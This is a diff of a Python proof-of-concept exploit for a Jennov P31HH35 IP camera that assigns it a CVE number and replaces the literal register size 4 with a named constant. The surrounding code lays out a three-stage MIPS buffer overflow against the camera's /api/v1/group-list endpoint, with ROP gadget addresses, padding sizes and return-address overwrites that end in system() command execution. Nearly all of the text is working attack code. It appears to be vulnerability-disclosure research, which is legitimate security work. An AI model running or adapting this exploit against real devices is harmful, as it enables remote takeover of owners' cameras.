@@ -3,7 +3,7 @@ Jennov_P31HH35-3-FAS_PoC.py
 
 Author: Evan Ritz
 
-CVE(s): TBD
+CVE(s): CVE-2025-25690
 
 THE SOFTWARE IS PROVIDED "AS IS" AND THE AUTHOR DISCLAIMS ALL WARRANTIES WITH REGARD TO THIS 
 SOFTWARE INCLUDING ALL IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS. IN NO EVENT SHALL THE 
@@ -35,6 +35,7 @@ import requests
 from time import sleep
 
 VULNERABLE_ENDPOINT = '/api/v1/group-list'
+REG_SIZE_IN_BYTES = 4
 
 def isWebServerExposed():
     '''
@@ -73,7 +74,7 @@ def stage1():
     ADDRESS_OF_SAVE_TO_FILE_GADGET = b'\xd8\x15\x40' # 0x004015d8
 
     DEVICE_ID_OVERFLOW_SIZE =  0x170
-    DEVICE_ID_OVERFLOW_SIZE -= 1 * 4
+    DEVICE_ID_OVERFLOW_SIZE -= 1 * REG_SIZE_IN_BYTES
 
     device_id_data =  b'D' * DEVICE_ID_OVERFLOW_SIZE
     device_id_data += ADDRESS_OF_SAVE_TO_FILE_GADGET # $ra
@@ -82,7 +83,7 @@ def stage1():
     ADDRESS_OF_STRING = b'\xc8\x7d\x40' # 0x00407dc8
 
     ACCESS_KEY_OVERFLOW_SIZE =  0xf0
-    ACCESS_KEY_OVERFLOW_SIZE -= 7 * 4
+    ACCESS_KEY_OVERFLOW_SIZE -= 7 * REG_SIZE_IN_BYTES
 
     access_key_data =  b'A' * ACCESS_KEY_OVERFLOW_SIZE
     access_key_data += ADDRESS_OF_STRING # $s0
@@ -148,7 +149,7 @@ def stage2():
     ADDRESS_OF_RENAME_GADGET = b'\x68\x29\x40' # 0x00402968
 
     ACCESS_KEY_OVERFLOW_SIZE =  0xf0
-    ACCESS_KEY_OVERFLOW_SIZE -= 1 * 4
+    ACCESS_KEY_OVERFLOW_SIZE -= 1 * REG_SIZE_IN_BYTES
 
     access_key_data =  b'A' * ACCESS_KEY_OVERFLOW_SIZE
     access_key_data += ADDRESS_OF_RENAME_GADGET # $ra
@@ -196,7 +197,7 @@ def stage3():
     ADDRESS_OF_SYSTEM_GADGET = b'\x94\x41\x40' # 0x00404194
 
     DEVICE_ID_OVERFLOW_SIZE =  0x170
-    DEVICE_ID_OVERFLOW_SIZE -= 1 * 4
+    DEVICE_ID_OVERFLOW_SIZE -= 1 * REG_SIZE_IN_BYTES
 
     device_id_data =  b'D' * DEVICE_ID_OVERFLOW_SIZE
     device_id_data += ADDRESS_OF_SYSTEM_GADGET # $ra
@@ -211,17 +212,17 @@ def stage3():
     ADDRESS_OF_COMMAND_IN_GLOBAL_DEBUG_BUFFER += 50
     # Since device_id overflows into access_key and removes NULL terminator, the command can be stored in access_key
     ADDRESS_OF_COMMAND_IN_GLOBAL_DEBUG_BUFFER += 0x170
-    ADDRESS_OF_COMMAND_IN_GLOBAL_DEBUG_BUFFER -= 7 * 4 # $s0 - $s5 and $ra
+    ADDRESS_OF_COMMAND_IN_GLOBAL_DEBUG_BUFFER -= 7 * REG_SIZE_IN_BYTES # $s0 - $s5 and $ra
     ADDRESS_OF_COMMAND_IN_GLOBAL_DEBUG_BUFFER -= command_len
     ADDRESS_OF_COMMAND_IN_GLOBAL_DEBUG_BUFFER = ADDRESS_OF_COMMAND_IN_GLOBAL_DEBUG_BUFFER.to_bytes(3, 'little') 
 
     ACCESS_KEY_OVERFLOW_SIZE =  0xf0
-    ACCESS_KEY_OVERFLOW_SIZE -= 7 * 4
+    ACCESS_KEY_OVERFLOW_SIZE -= 7 * REG_SIZE_IN_BYTES
     ACCESS_KEY_OVERFLOW_SIZE -= command_len
 
     access_key_data =  b'A' * ACCESS_KEY_OVERFLOW_SIZE
     access_key_data += command
-    access_key_data += b'S' * 4 * 4 # s0 - s3
+    access_key_data += b'S' * 4 * REG_SIZE_IN_BYTES # s0 - s3
     access_key_data += ADDRESS_OF_COMMAND_IN_GLOBAL_DEBUG_BUFFER # $s4
 
     # build url
